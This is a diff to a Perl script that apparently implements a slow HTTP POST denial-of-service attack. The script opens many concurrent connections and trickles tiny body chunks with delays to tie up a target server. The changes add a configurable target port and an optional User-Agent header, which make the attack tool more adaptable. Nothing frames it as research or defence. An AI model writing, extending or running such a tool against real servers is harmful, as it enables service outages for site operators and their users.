@@ -30,7 +30,6 @@ use AnyEvent;
 use AnyEvent::Handle;
 
 my $port = 80;
-
 my $concurrency = 25;
 my $min_chunk_size = 4;
 my $max_chunk_size = 16;
@@ -38,12 +37,14 @@ my $min_body_size = $max_chunk_size * 512;
 my $max_body_size = $min_body_size * 4;
 my $body_send_delay = 2;
 my $connection_delay = 1;
+my $user_agent = '';
 
 my $help;
 
 my $help_message = <<HELP
 Usage: $0 [options] hostname
 
+  --port=NUM                target port number (default: $port)
   --concurrency=NUM         number of concurrent connections (default: $concurrency)
   --min-chunk-size=BYTES    min post body chunk size in bytes (default: $min_chunk_size)
   --max-chunk-size=BYTES    max post body chunk size in bytes (default: $max_chunk_size)
@@ -53,11 +54,13 @@ Usage: $0 [options] hostname
                             previous chunk and start of sending next chunk
                             (default: $connection_delay)
   --connection-delay=SEC    delay in seconds before reconnecting (default: $connection_delay)
+  --user-agent=STRING       http user agent (default: no User-Agent header)
 
 HELP
 ;
 
 GetOptions(
+    'port=i' => \$port,
     'concurrency=i' => \$concurrency,
     'min-chunk-size=i' => \$min_chunk_size,
     'max-chunk-size=i' => \$max_chunk_size,
@@ -65,6 +68,7 @@ GetOptions(
     'max-body-size=i' => \$max_body_size,
     'connection-delay=f' => \$connection_delay,
     'body-send-delay=f' => \$body_send_delay,
+    'user-agent=s' => \$user_agent,
     'help' => \$help,
 );
 
@@ -89,6 +93,7 @@ foreach my $n (1 .. $concurrency) {
         max_chunk_size => $max_chunk_size,
         min_body_size => $min_body_size,
         max_body_size => $max_body_size,
+        user_agent => $user_agent,
     );
     
     $client->connect;
@@ -177,6 +182,7 @@ sub send_headers {
     my $request = "POST $self->{path} HTTP/1.1\n" .
         "Host: $self->{host}\n" .
         "Content-Type: application/x-www-form-urlencoded\n" .
+        (length $self->{user_agent} ? "User-Agent: $self->{user_agent}\n" : '') .
         "Content-Length: " . length($self->{body}) . "\n" .
         "\n";
     
